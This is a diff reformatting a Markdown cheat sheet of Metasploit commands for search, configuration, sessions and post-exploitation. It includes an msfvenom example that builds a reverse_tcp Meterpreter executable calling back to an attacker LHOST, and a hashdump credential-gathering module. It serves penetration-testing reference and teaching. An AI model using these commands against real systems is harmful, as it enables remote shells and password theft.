@@ -1,14 +1,16 @@
 
-# Metasploit Command Cheat Sheet
+## Metasploit Command Cheat Sheet {.cols-1}
 
-## 🧰 Initialization & Help
+### 🧰 Initialization & Help
 | Function                   | Command                            | Example                            |
 |----------------------------|-------------------------------------|------------------------------------|
 | Start Metasploit Console   | `msfconsole`                        | `msfconsole`                        |
 | Help and Usage Information | `metasploit -h` / `--help`         | `metasploit -h`                     |
 | Exit Metasploit Console    | `exit`                              | `exit`                              |
 
-## 🔍 Searching & Selecting Modules
+## {.cols-2}
+
+### 🔍 Searching & Selecting Modules
 | Function                     | Command                           | Example                                                      |
 |------------------------------|------------------------------------|--------------------------------------------------------------|
 | Search Exploits              | `search <keyword>`                 | `search type:exploit name:smb`                               |
@@ -20,7 +22,7 @@
 | Show NOP Generators          | `show nops`                        | `show nops`                                                  |
 | Show Post Modules            | `show post`                        | `show post`                                                  |
 
-## ⚙️ Configuring Options
+### ⚙️ Configuring Options
 | Function                     | Command                           | Example                                                      |
 |------------------------------|------------------------------------|--------------------------------------------------------------|
 | Set Target Host              | `set RHOSTS <target_ip>`           | `set RHOSTS 192.168.1.1`                                     |
@@ -32,13 +34,13 @@
 | Unset Global Option          | `unsetg <option>`                  | `unsetg LHOST`                                               |
 | Check Target Vulnerability   | `check`                            | `check`                                                      |
 
-## 🚀 Exploitation & Payloads
+### 🚀 Exploitation & Payloads
 | Function                     | Command                            | Example                                                      |
 |------------------------------|-------------------------------------|--------------------------------------------------------------|
 | Run Exploit                  | `run` / `exploit`                   | `exploit`                                                    |
 | Generate Payload             | `msfvenom -p <payload> -f <format> <options>` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe` |
 
-## 🖥️ Sessions Management
+### 🖥️ Sessions Management
 | Function                     | Command                            | Example                            |
 |------------------------------|-------------------------------------|------------------------------------|
 | View Active Sessions         | `sessions -l`                       | `sessions -l`                       |
@@ -48,7 +50,9 @@
 | Save Active Sessions         | `sessions -s`                       | `sessions -s`                       |
 | Load Saved Sessions          | `sessions -r <session_file>`        | `sessions -r my_sessions.txt`       |
 
-## 🔄 Post-Exploitation & Pivoting
+## {.cols-1}
+
+### 🔄 Post-Exploitation & Pivoting
 | Function                     | Command                            | Example                            |
 |------------------------------|-------------------------------------|------------------------------------|
 | Run Post-Exploitation Script | `run <module_path>`                 | `run post/windows/gather/hashdump` |
